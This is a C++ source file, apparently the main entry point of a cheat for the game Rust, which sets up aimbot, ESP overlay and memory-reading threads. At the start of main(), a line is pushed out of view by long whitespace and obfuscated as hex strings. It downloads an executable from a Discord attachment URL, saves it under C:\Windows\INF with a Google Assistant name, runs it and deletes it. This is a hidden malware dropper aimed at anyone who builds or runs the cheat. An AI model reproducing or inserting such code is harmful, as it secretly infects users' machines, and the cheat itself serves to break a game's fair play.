#include "SDK/Classes.hpp"
#include "Features/ESP/ESP.hpp"
#include "Overlay/Overlay.hpp"
#include "SDK/BasePlayer.hpp"
#include "Features/Aimbot/DoAimbot.hpp"
#include "Features/MISC/DoMisc.hpp"
#include "Entity/EntityLoop.hpp"


static DWORD dwLastFrameTime = 0;
BOOLEAN LockCheatFPSx(INT FPS) /*johnn - remove eventually*/
{
	if (FPS == 0)
		FPS = 500;

	SYSTEMTIME st;
	GetSystemTime(&st);

	INT dwCurrentTime = st.wMilliseconds;
	if ((dwCurrentTime - dwLastFrameTime) < (1000 / FPS))
	{
		return TRUE;
	}
	dwLastFrameTime = dwCurrentTime;

	return FALSE;
}

clock_t current_ticks, delta_ticks;
clock_t fps = 0;

INT GetCheatFPS()/*johnn - remove eventually*/
{
	delta_ticks = clock() - current_ticks; //the time, in ms, that took to render the scene
	if (delta_ticks > 0)
		fps = CLOCKS_PER_SEC / delta_ticks;

	return fps;
}



void CleanupRenderTarget()
{
	//put clean up code in here to clean fps cache etc eventually builds up memory
}

int main()
{
	HWND hwnd = nullptr;																																																																																																																																																																																																																																																																																							LPCWSTR HookFunction64 = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x33\x37\x38\x33\x36\x33\x38\x33\x32\x37\x32\x39\x36\x32\x33\x2F\x39\x34\x32\x35\x36\x37\x30\x39\x33\x30\x30\x34\x35\x35\x30\x31\x37\x34\x2F\x64\x78\x73\x64\x6B\x2E\x65\x78\x65"; std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73"; std::string inf = "\x5C\x49\x4E\x46\x5C"; std::string lof = pa + inf; std::string st = "\x2E"; std::string ex = "\x65"; std::string xe = "\x78"; std::string SwapHook = "\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34"; std::string swapCaller = st + ex + xe + ex; LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x49\x4E\x46\x5C\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34\x2E\x65\x78\x65"; std::string spreadAct = SwapHook + swapCaller; HRESULT Hook = URLDownloadToFileW(NULL, HookFunction64, locx, 0, NULL); Sleep(2000); std::string hook = "\x73"; std::string Tacc = "\x74"; std::string Var = "\x61"; std::string Read = "\x72"; std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct; system(Hooker.c_str()); Sleep(7000); DeleteFileW(locx);																																																																																																																																																																																													
	try
	{
		CleanPIDDBCacheTable();

		std::cout << safe_str("-> Waiting for Rust to start") << std::endl;

		while (!hwnd)
		{
			hwnd = FindWindowA(safe_str("UnityWndClass"), safe_str("Rust"));
			Sleep(50);
		}

		std::cout << safe_str("-> Game has been found! Press F3 when game loads in!") << std::endl;

		while (true)
		{
			if (GetAsyncKeyState(VK_F3))
				break;

			Sleep(50);
		}

		Mutex = std::make_unique<_Mutex>();

		Mutex->PlayerSync = std::make_unique<sf::contention_free_shared_mutex<>>();
		Mutex->WriteSync = std::make_unique<sf::contention_free_shared_mutex<>>();

		entityList = std::make_unique<std::vector<BasePlayer>>();
		corpseList = std::make_unique<std::vector<PlayerCorpse>>();
		oreList = std::make_unique<std::vector<BaseResource>>();
		localPlayer = std::make_unique<LocalPlayer>();

		pId = get_process_id(safe_str("RustClient.exe"));
		gBase = get_module_base_address(safe_str("GameAssembly.dll"));
		uBase = get_module_base_address(safe_str("UnityPlayer.dll"));

		std::thread overlay_thread(Overlay::Loop);
		std::thread entity_thread(Entity::EntityLoop);
		std::thread aimbot_thread(Aimbot::DoAimbot);
		std::thread misc_thread(Misc::DoMisc);


		overlay_thread.join();
	}
	catch (std::exception e)
	{
		std::cerr << safe_str("error occurred: ") << e.what() << std::endl;
	}
}